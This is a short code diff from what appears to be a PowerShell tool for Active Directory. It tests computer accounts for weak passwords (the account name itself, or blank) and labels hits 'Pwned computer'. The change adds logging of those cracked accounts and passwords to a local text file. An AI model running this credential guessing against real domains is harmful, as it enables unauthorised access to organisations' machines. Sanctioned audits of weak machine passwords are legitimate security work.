@@ -165,10 +165,12 @@ Function Test-Computers {
         }
         
         write-host Pwned computer: $_ using password: $_.Replace("`$","").ToLower() -ForegroundColor Cyan
+        Add-Content -Path .\pwnedcomputers.txt -Value "Pwned computer: $_ using password: $_.Replace("`$","").ToLower()"
       } else {
           $valid = Test-ADAuthentication -username $_ -password ""
             if ($valid) {
               write-host Pwned computer $_ no password -ForegroundColor Cyan
+              Add-Content -Path .\pwnedcomputers.txt -Value "Pwned computer: $_ no password"
             }
           }
 
